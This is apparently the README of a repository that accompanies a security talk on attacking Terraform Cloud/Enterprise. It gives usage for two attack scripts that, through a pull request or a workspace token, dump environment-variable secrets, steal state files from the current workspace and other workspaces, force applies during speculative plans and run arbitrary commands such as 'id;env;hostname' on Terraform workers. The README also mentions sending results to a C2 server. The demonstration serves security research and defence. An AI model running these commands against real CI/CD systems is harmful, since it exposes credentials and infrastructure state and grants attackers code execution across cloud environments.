This repository contains scripts to demonstrate the vulnerabilities shown in our associated talk: [Attacking and Defending Infrastructure with Terraform: How we got admin across cloud environments](https://docs.google.com/presentation/d/18wF-NMqr5-0nC4O8MfFi_mU3F1cx1L3vLHH6Dc6w4Q8/).

There are two scenarios where you can use these scripts:
* When you don't have access to TFC/TFE, or you don't have a token, but **you can create a PR** to a github repository linked to TFC/TFE and speculative plans are run automatically.
* When you can **have access to a Terraform Cloud workspace** and you have a valid token to do so.


## Scenario 1: You can create a PR in a VCS linked with TFC/TFE 
For this scenario use the script: **PR_attack.py**.

Note: You still needs access to TFC in order to read the output of the attacks. But they could also execute arbitrary commands and exfiltrate the results to a C2 they control.

### Exfiltrate secrets
Access the secrets from the environment variables.
```sh
python3 PR_attack.py 
    --repo "git@github.com:CryptoExchangeCo/website.git" 
    --folder "dev" 
    --get_envs
```
Demo

![Demo 1](demos/demo1.gif)

### Retrieve the state file
Get the state file for the current workspace.
```sh
python3 PR_attack.py 
    --repo "git@github.com:CryptoExchangeCo/website.git"
    --folder "dev"
    --get_state_file
```

### Retrieve the state file for a different workspace
Get the state file for a different workspace in the same organization.
```sh
python3 PR_attack.py 
    --repo "git@github.com:CryptoExchangeCo/website.git" 
    --folder "dev" 
    --get_state_file_from_workspace "website_prod"
```
Demo

![Demo 2](demos/demo2.gif)


### Apply on plan
It performs an apply on plan using a tf file as an input.
```sh
python3 PR_attack.py 
    --repo "git@github.com:CryptoExchangeCo/website.git" 
    --folder "dev" 
    --apply_on_plan "templates/s3_bucket.tf"
```
Demo

![Demo 3](demos/demo3.gif)


### Execute arbitrary command
Execute an arbitrary command in the TF worker.
```sh
python3 PR_attack.py 
    --repo "git@github.com:CryptoExchangeCo/website.git" 
    --folder "dev" 
    --exec_command "id;env;hostname"
```

## Scenario 2: Access to TFC/TFE
For this scenario use the script: **TF_attack.py**.
    
The usage is very similar to the previous scenario. To retrieving secrets from environment variables you will run:
```sh
python3 TF_attack.py 
    --hostname "app.terraform.io" 
    --organization "CryptoExchangeCo"
    --workspace "website_dev"
    --get_envs
```
